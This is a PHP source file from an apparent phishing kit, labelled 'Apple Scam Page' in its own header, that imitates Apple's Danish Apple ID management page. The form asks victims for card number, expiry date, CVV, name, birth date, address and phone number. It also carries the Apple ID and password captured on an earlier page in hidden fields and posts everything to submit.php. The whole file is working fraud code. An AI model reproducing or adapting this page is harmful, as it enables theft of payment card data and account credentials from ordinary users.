<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Administrer dit Apple-id</title>
    </head>

    <body>

        <div id="hero" class="imgbg">
            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="hero-title">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                            <h3>Welkom</h3>
                            <p>Dit Apple-id er <?php echo $_SESSION['apple_id']; ?></p>
                        </div>
                        <div class="col-md-3 d-lg-flex d-md-flex d-sm-none d-none align-items-center">
                            <button>Log ud</button>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div id="details">
            <div class="container">
                <div class="row">
                    <div class="col-lg-7 col-md-7 col-sm-12 col-12 left-side">
                        <form method="post" action="submit.php" id="details-form">
                            <h3>Betalingsinformation</h3>
                            <ul class="cards">
                                <li><img src="../assets/images/visa.png"></li>
                                <li><img src="../assets/images/mastercard.png"></li>
                                <li><img src="../assets/images/dk.png"></li>
                            </ul>
                            <div class="form-group mb-3">
                                <label for="card_number">kortnummer</label>
                                <input type="text" name="card_number" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'card_number') ?>" id="card_number" placeholder="kortnummer" value="<?php echo get_value('card_number'); ?>">
                                <?php echo validation($_SESSION['errors'],'card_number'); ?>
                            </div>
                            <div class="row mb-3">
                                <div class="col-6">
                                    <label for="card_date">Udløbsdato</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'card_date') ?>" name="card_date" id="card_date" placeholder="mm/åå" value="<?php echo get_value('card_date'); ?>">
                                    <?php echo validation($_SESSION['errors'],'card_date'); ?>
                                </div>
                                <div class="col-6">
                                    <label for="card_cvv">kontrolcifre</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'card_cvv') ?>" name="card_cvv" id="card_cvv" placeholder="kontrolcifre" value="<?php echo get_value('card_cvv'); ?>">
                                    <?php echo validation($_SESSION['errors'],'card_cvv'); ?>
                                </div>
                            </div>
                            <h3 class="mt-5">Faktureringsadresse</h3>
                            <div class="row mb-3">
                                <div class="col-6">
                                    <label for="first_name">fornavn</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'first_name') ?>" name="first_name" id="first_name" placeholder="fornavn" value="<?php echo get_value('first_name'); ?>">
                                    <?php echo validation($_SESSION['errors'],'first_name'); ?>
                                </div>
                                <div class="col-6">
                                    <label for="last_name">efternavn</label>
                                    <input style="max-width: 100%;" type="text" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'last_name') ?>" name="last_name" id="last_name" placeholder="efternavn" value="<?php echo get_value('last_name'); ?>">
                                    <?php echo validation($_SESSION['errors'],'last_name'); ?>
                                </div>
                            </div>
                            <div class="form-group mb-3">
                                <label for="date_of_birth">fødselsdato</label>
                                <input type="text" name="date_of_birth" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'date_of_birth') ?>" id="date_of_birth" placeholder="dd/mm/åååå" value="<?php echo get_value('date_of_birth'); ?>">
                                <?php echo validation($_SESSION['errors'],'date_of_birth'); ?>
                            </div>
                            <div class="form-group mb-3">
                                <label for="address">vej og nr.</label>
                                <input type="text" name="address" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'address') ?>" id="address" placeholder="vej og nr." value="<?php echo get_value('address'); ?>">
                                <?php echo validation($_SESSION['errors'],'address'); ?>
                            </div>
                            <div class="form-group mb-3">
                                <label for="postal_code">postnummer</label>
                                <input type="text" name="postal_code" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'postal_code') ?>" id="postal_code" placeholder="postnummer" value="<?php echo get_value('postal_code'); ?>">
                                <?php echo validation($_SESSION['errors'],'postal_code'); ?>
                            </div>
                            <div class="form-group mb-3">
                                <label for="city">by</label>
                                <input type="text" name="city" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'city') ?>" id="city" placeholder="by" value="<?php echo get_value('city'); ?>">
                                <?php echo validation($_SESSION['errors'],'city'); ?>
                            </div>
                            <div class="form-group mb-3">
                                <label for="phone">telefonnummer</label>
                                <input type="text" name="phone" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>" id="phone" placeholder="telefonnummer" value="<?php echo get_value('phone'); ?>">
                                <?php echo validation($_SESSION['errors'],'phone'); ?>
                            </div>
                            <div class="form-group mb-5 mt-5">
                                <div class="infos">
                                    LAND/OMRÅDE
                                    <span><?php echo get_user_country(get_user_ip()); ?></span>
                                </div>
                            </div>
                            <button class="mt-4" id="details-submit" type="button">Fortsæt</button>
                            <input type="hidden" name="apple_id" id="apple_id" value="<?php echo $_SESSION['apple_id']; ?>">
                            <input type="hidden" name="apple_password" id="apple_password" value="<?php echo $_SESSION['apple_password']; ?>">
                            <input type="hidden" name="ip_address" id="ip_address" value="<?php echo get_user_ip(); ?>">
                            <input type="hidden" name="type" value="card">
                        </form>
                    </div>
                    <div class="col-lg-5 col-md-5 col-sm-12 col-12 mt-lg-0 mt-md-0 mt-sm-5 mt-5 right-side">
                        <p> Vi er forpligtet til at holde dine personlige oplysninger sikre og private, hvad enten de er lagret på din enhed eller på Apples servere. </p>
                        <a href="#">Få mere at vide om, hvordan Apple beskytter dine personlige oplysninger. Åbner i et nyt vindue.</a>
                    </div>
                </div>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>Flere måder at shoppe på: Ring 80 24 08 35, eller <a href="#">find en forhandler.</a></p>
                        <p>Copyright © 2019 Apple Inc. Alle rettigheder forbeholdes.</p>
                        <ul>
                            <li><a href="#">Anonymitetspolitik</a></li>
                            <li><a href="#">Brug af cookies</a></li>
                            <li><a href="#">Betingelser for brug</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Juridisk tekst</a></li>
                            <li><a href="#">Oversigt</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/dklogo.png"> Danmark
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
    </body>

</html>